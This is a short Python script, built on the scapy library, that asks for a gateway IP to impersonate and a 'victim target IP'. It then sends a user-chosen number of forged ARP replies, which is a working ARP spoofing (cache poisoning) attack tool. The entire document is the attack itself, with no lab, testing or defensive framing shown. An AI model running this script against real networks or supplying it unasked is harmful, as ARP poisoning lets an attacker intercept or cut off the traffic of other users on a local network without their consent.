from scapy.all import ARP, send

fake_gateway_ip = input("Enter fake gateway IP to spoof: ")
target_ip       = input("Enter victim target IP: ")

arp = ARP(op=2, psrc=fake_gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff")
count = int(input("Number of packets to send: "))

print(f"Sending {count} forged ARP replies...")
send(arp, count=count, inter=1)
print("Done.")
